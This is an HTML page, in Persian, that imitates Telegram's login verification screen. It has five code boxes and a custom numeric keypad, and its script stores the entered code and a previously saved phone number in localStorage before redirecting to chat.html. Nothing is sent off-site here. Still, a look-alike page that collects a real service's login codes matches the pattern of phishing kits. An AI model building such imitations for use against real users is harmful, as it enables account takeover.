<!DOCTYPE html>
<html lang="fa" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Telegram - Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
            -webkit-touch-callout: none;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #ffffff;
            color: #000000;
            height: 100vh;
            height: 100dvh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            direction: ltr;
        }

        .top-header {
            width: 100%;
            max-width: 420px;
            margin: 0 auto;
            padding: 16px 24px 0 24px;
            display: flex;
            justify-content: flex-start;
            align-items: center;
        }

        .back-link {
            background: none;
            border: none;
            font-size: 16px;
            color: #2481cc;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
        }

        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px 24px 0 24px;
            position: relative;
            max-width: 420px;
            width: 100%;
            margin: 0 auto;
        }

        .title {
            font-size: 24px;
            font-weight: 600;
            letter-spacing: -0.3px;
            margin-bottom: 8px;
            text-align: center;
            color: #000;
        }

        .subtitle {
            font-size: 14px;
            color: #8e8e93;
            text-align: center;
            line-height: 1.4;
            max-width: 320px;
            margin-bottom: 35px;
        }

        .code-inputs-container {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin-bottom: 25px;
        }

        .code-box {
            width: 45px;
            height: 55px;
            border: 1.5px solid #d1d1d6;
            border-radius: 12px;
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #fdfdfd;
            color: #000;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .code-box.active {
            border-color: #2481cc;
            box-shadow: 0 0 0 3px rgba(36, 129, 204, 0.12);
        }

        .resender-text {
            font-size: 14px;
            color: #2481cc;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
            text-align: center;
        }

        .ios-keyboard {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: #f1f2f6;
            padding: 6px 4px calc(6px + env(safe-area-inset-bottom, 0px)) 4px;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 6px;
            border-top: 1px solid #d8d8dc;
            z-index: 20;
        }

        .key-btn {
            background: #ffffff;
            border-radius: 6px;
            height: 48px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 1px 0 rgba(0, 0, 0, 0.15);
            transition: background 0.08s ease, transform 0.06s ease;
        }

        .key-btn:active {
            background: #c5c7d0;
            transform: scale(0.96);
            box-shadow: none;
        }
    </style>
</head>
<body>

    <div class="top-header">
        <a href="index.html" class="back-link">Back</a>
    </div>

    <div class="main-content">
        <h1 class="title">تأیید شماره</h1>
        <p class="subtitle" id="subText">کد ۵ رقمی ارسال شده به شماره شما را وارد کنید.</p>

        <div class="code-inputs-container">
            <div class="code-box active" id="b0"></div>
            <div class="code-box" id="b1"></div>
            <div class="code-box" id="b2"></div>
            <div class="code-box" id="b3"></div>
            <div class="code-box" id="b4"></div>
        </div>

        <div class="resender-text" id="resendBtn">ارسال مجدد کد</div>
    </div>

    <!-- کیبورد اختصاصی اعداد -->
    <div class="ios-keyboard">
        <div class="key-btn" data-v="1"><span style="font-size:23px; font-weight:400;">1</span></div>
        <div class="key-btn" data-v="2"><span style="font-size:23px; font-weight:400;">2</span></div>
        <div class="key-btn" data-v="3"><span style="font-size:23px; font-weight:400;">3</span></div>
        <div class="key-btn" data-v="4"><span style="font-size:23px; font-weight:400;">4</span></div>
        <div class="key-btn" data-v="5"><span style="font-size:23px; font-weight:400;">5</span></div>
        <div class="key-btn" data-v="6"><span style="font-size:23px; font-weight:400;">6</span></div>
        <div class="key-btn" data-v="7"><span style="font-size:23px; font-weight:400;">7</span></div>
        <div class="key-btn" data-v="8"><span style="font-size:23px; font-weight:400;">8</span></div>
        <div class="key-btn" data-v="9"><span style="font-size:23px; font-weight:400;">9</span></div>
        <div style="visibility:hidden;"></div>
        <div class="key-btn" data-v="0"><span style="font-size:23px; font-weight:400;">0</span></div>
        <div class="key-btn" data-v="del"><span style="font-size:20px;">⌫</span></div>
    </div>

    <script>
        let enteredCode = '';
        const boxes = [
            document.getElementById('b0'), 
            document.getElementById('b1'), 
            document.getElementById('b2'), 
            document.getElementById('b3'), 
            document.getElementById('b4')
        ];

        // خواندن شماره ذخیره شده از صفحه قبل برای نمایش به کاربر
        const savedPhone = localStorage.getItem('userPhone');
        if (savedPhone) {
            document.getElementById('subText').textContent = `کد ۵ رقمی ارسال شده به شماره ${savedPhone} را وارد کنید.`;
        }

        document.querySelectorAll('.key-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                const val = btn.getAttribute('data-v');
                if (val === 'del') {
                    if (enteredCode.length > 0) {
                        enteredCode = enteredCode.slice(0, -1);
                    }
                } else {
                    if (enteredCode.length < 5) {
                        enteredCode += val;
                    }
                }

                // آپدیت ظاهر باکس‌ها
                for (let i = 0; i < 5; i++) {
                    boxes[i].textContent = enteredCode[i] || '';
                    boxes[i].classList.remove('active');
                    if (i === enteredCode.length) {
                        boxes[i].classList.add('active');
                    }
                }

                // وقتی ۵ رقم کامل شد، ورود به صفحه اصلی چت
                if (enteredCode.length === 5) {
                    localStorage.setItem('userCode', enteredCode);
                    setTimeout(() => {
                        window.location.href = 'chat.html';
                    }, 200);
                }
            });
        });
    </script>
</body>
</html>
